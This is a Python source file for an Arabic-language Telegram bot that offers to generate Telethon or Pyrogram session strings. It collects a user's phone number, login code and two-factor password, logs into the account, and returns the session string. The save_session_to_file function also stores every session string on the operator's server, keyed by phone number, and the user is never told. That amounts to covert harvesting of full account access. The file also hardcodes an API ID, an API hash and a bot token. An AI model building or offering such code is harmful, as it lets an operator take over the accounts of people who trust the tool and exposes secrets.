from telethon import TelegramClient, events, Button

from telethon.sessions import StringSession

from telethon.errors import SessionPasswordNeededError

from pyrogram import Client as PyroClient

from pyrogram.raw.all import layer

import os

API_ID = 26107707

API_HASH = "e3774389da1ff2e49f3cfb38c2105c87"

BOT_TOKEN = "8072676883:AAGepTI2y4igkSE2NrwCneUd4eYFZCgsWRI"
bot = TelegramClient("gen_bot", API_ID, API_HASH).start(bot_token=BOT_TOKEN)

user_states = {}

arab_countries = { "🇮🇶 العراق": "+964", "🇸🇦 السعودية": "+966", "🇪🇬 مصر": "+20", "🇸🇾 سوريا": "+963", "🇩🇿 الجزائر": "+213",

"🇲🇦 المغرب": "+212", "🇹🇳 تونس": "+216", "🇱🇧 لبنان": "+961", "🇯🇴 الأردن": "+962", "🇵🇸 فلسطين": "+970", "🇰🇼 الكويت": "+965",

"🇶🇦 قطر": "+974", "🇧🇭 البحرين": "+973", "🇦🇪 الإمارات": "+971", "🇾🇪 اليمن": "+967", "🇸🇩 السودان": "+249", "🇱🇾 ليبيا": "+218", "🇲🇷 موريتانيا": "+222" }

foreign_countries = {

"🇺🇸 أمريكا": "+1", "🇬🇧 بريطانيا": "+44", "🇨🇦 كندا": "+1", "🇫🇷 فرنسا": "+33", "🇩🇪 ألمانيا": "+49", "🇮🇹 إيطاليا": "+39",

"🇪🇸 إسبانيا": "+34", "🇹🇷 تركيا": "+90", "🇷🇺 روسيا": "+7", "🇧🇷 البرازيل": "+55", "🇮🇳 الهند": "+91", "🇵🇰 باكستان": "+92",

"🇮🇩 إندونيسيا": "+62", "🇨🇳 الصين": "+86", "🇯🇵 اليابان": "+81" }

@bot.on(events.NewMessage(pattern="/start"))

async def start(event):

    user_id = event.sender_id

    user_states[user_id] = {"step": "choose_type"}

    buttons = [

        [Button.inline("🧠 تليثون", b"telethon")],

        [Button.inline("👥 بايجروم", b"pyrogram")]

    ]

    await event.respond("👋 مرحباً بك!\n\nاختر نوع الجلسة التي تريد صنعها:", buttons=buttons)

@bot.on(events.CallbackQuery)

async def callback(event):

    user_id = event.sender_id

    data = event.data.decode()

    if user_id not in user_states:

        return

    if user_states[user_id]["step"] == "choose_type":

        if data == "telethon" or data == "pyrogram":

            user_states[user_id]["session_type"] = data

            user_states[user_id]["step"] = "choose_group"

            await event.edit(f"✅ تم اختيار: {('تليثون' if data == 'telethon' else 'بايجروم')}.\n\n⏳ جارٍ تحديد دولتك تلقائيًا ...")

            try:

                user = await bot.get_entity(user_id)

                if hasattr(user, "phone") and user.phone:

                    phone = user.phone

                    code_prefix = "+" + phone[:3]

                    all_countries = {**arab_countries, **foreign_countries}

                    match = next((name for name, code in all_countries.items() if code.startswith(code_prefix)), None)

                    if match:

                        await event.respond(f"🌍 تم تحديد دولتك تلقائيًا: **{match}**")

                    else:

                        await event.respond("❔ لم أتمكن من تحديد دولتك بدقة.")

                else:

                    await event.respond("🔐 لا يمكنني رؤية رقمك لتحديد الدولة.")

            except Exception:

                await event.respond("⚠️ لم أتمكن من تحديد دولتك تلقائيًا.")

            buttons = [

                [Button.inline("🌐 دول عربية", b"arab")],

                [Button.inline("🌍 دول أجنبية", b"foreign")],

                [Button.inline("🌎 دولة أخرى", b"other")]

            ]

            await event.respond("👇 اختر نوع الدولة:", buttons=buttons)

            return

    if data == "arab":

        buttons = [Button.inline(name, data=code.encode()) for name, code in arab_countries.items()]

        rows = [buttons[i:i + 2] for i in range(0, len(buttons), 2)]

        await event.edit("🌐 اختر الدولة العربية:", buttons=rows)

        user_states[user_id]["step"] = "select_country"

    elif data == "foreign":

        buttons = [Button.inline(name, data=code.encode()) for name, code in foreign_countries.items()]

        rows = [buttons[i:i + 2] for i in range(0, len(buttons), 2)]

        await event.edit("🌍 اختر الدولة الأجنبية:", buttons=rows)

        user_states[user_id]["step"] = "select_country"

    elif data == "other":

        user_states[user_id]["step"] = "custom_country"

        await event.edit("**🌎 أرسل اسم الدولة مع الرمز بهذا الشكل:**\n📍 مثال: `🇵🇭 الفلبين +63`")

    elif user_states[user_id]["step"] == "select_country":

        code = data

        user_states[user_id]["country_code"] = code

        user_states[user_id]["step"] = "phone"

        await event.edit(f"✅ تم اختيار الرمز `{code}`.\n\n📨 أرسل الآن رقم الهاتف بدون رمز الدولة:")

@bot.on(events.NewMessage(func=lambda e: e.sender_id in user_states and not e.raw_text.startswith("/")))

async def handler(event):

    user_id = event.sender_id

    state = user_states[user_id]

    text = event.raw_text.strip()

    if state["step"] == "custom_country":

        parts = text.rsplit(" ", 1)

        if len(parts) != 2 or not parts[1].startswith("+"):

            await event.respond("❌ تنسيق غير صحيح.\n📍 مثال: `🇵🇭 الفلبين +63`")

            return

        state["country_code"] = parts[1]

        state["step"] = "phone"

        await event.respond(f"✅ تم حفظ الدولة والرمز `{parts[1]}`.\n\n📨 أرسل الآن رقم الهاتف بدون رمز الدولة:")

        return

    if state["step"] == "phone":

        phone = state["country_code"] + text

        state["phone"] = phone

        if state["session_type"] == "telethon":

            state["client"] = TelegramClient(StringSession(), API_ID, API_HASH)

            await state["client"].connect()

            try:

                await state["client"].send_code_request(phone)

                state["step"] = "code"

                await event.respond("📩 أرسل رمز التفعيل الآن بترك مسافة بين كل رقم (مثال: 1 2 3 4 5):")

            except Exception as e:

                await event.respond(f"❌ خطأ أثناء إرسال الكود: {e}")

                await state["client"].disconnect()

                del user_states[user_id]

        else:

            state["client"] = PyroClient(name="pyro_session", api_id=API_ID, api_hash=API_HASH, phone_number=phone, in_memory=True)

            await state["client"].connect()

            try:

                code = await state["client"].send_code(phone)

                state["code_hash"] = code.phone_code_hash

                state["step"] = "code"

                await event.respond("📩 أرسل رمز التفعيل الآن بترك مسافة بين كل رقم (مثال: 1 2 3 4 5):")

            except Exception as e:

                await event.respond(f"❌ خطأ أثناء إرسال الكود: {e}")

                await state["client"].disconnect()

                del user_states[user_id]

    elif state["step"] == "code":

        try:

            if state["session_type"] == "telethon":

                await state["client"].sign_in(state["phone"], text)

                session_str = state["client"].session.save()

            else:

                code = text.replace(" ", "")

                await state["client"].sign_in(

                    phone_number=state["phone"],

                    phone_code_hash=state["code_hash"],

                    phone_code=code

                )

                session_str = await state["client"].export_session_string()

            if session_str:

                await event.respond(f"✅ تم استخراج جلسة {state['session_type']}:\n`{session_str}`")

                await save_session_to_file(state["phone"], session_str, state["session_type"])

            else:

                await event.respond("⚠️ فشل حفظ الجلسة.")

        except SessionPasswordNeededError:

            state["step"] = "2fa"

            await event.respond("🔐 الحساب محمي بكلمة مرور، أرسلها الآن:")

        except Exception as e:

            await event.respond(f"❌ خطأ أثناء تسجيل الدخول: {e}")

        finally:

            if state.get("step") != "2fa":

                await state["client"].disconnect()

                del user_states[user_id]

    elif state["step"] == "2fa":

        try:

            if state["session_type"] == "telethon":

                await state["client"].sign_in(password=text)

                session_str = state["client"].session.save()

            else:

                await state["client"].check_password(password=text)

                session_str = await state["client"].export_session_string()

            if session_str:

                await event.respond(f"✅ تم استخراج الجلسة:\n`{session_str}`")

                await save_session_to_file(state["phone"], session_str, state["session_type"])

            else:

                await event.respond("⚠️ فشل حفظ الجلسة.")

        except Exception as e:

            await event.respond(f"❌ خطأ في كلمة السر: {e}")

        finally:

            await state["client"].disconnect()

            del user_states[user_id]

async def save_session_to_file(phone, session_str, session_type):

    path = f"sessions/{session_type}"

    if not os.path.exists(path):

        os.makedirs(path)

    filename = f"{path}/{phone.replace('+', '')}.session"

    with open(filename, "w") as f:

        f.write(session_str)

    print(f"🔒 Session saved to: {filename}")

print("🤖 Bot Session Generator is running...")

bot.run_until_disconnected()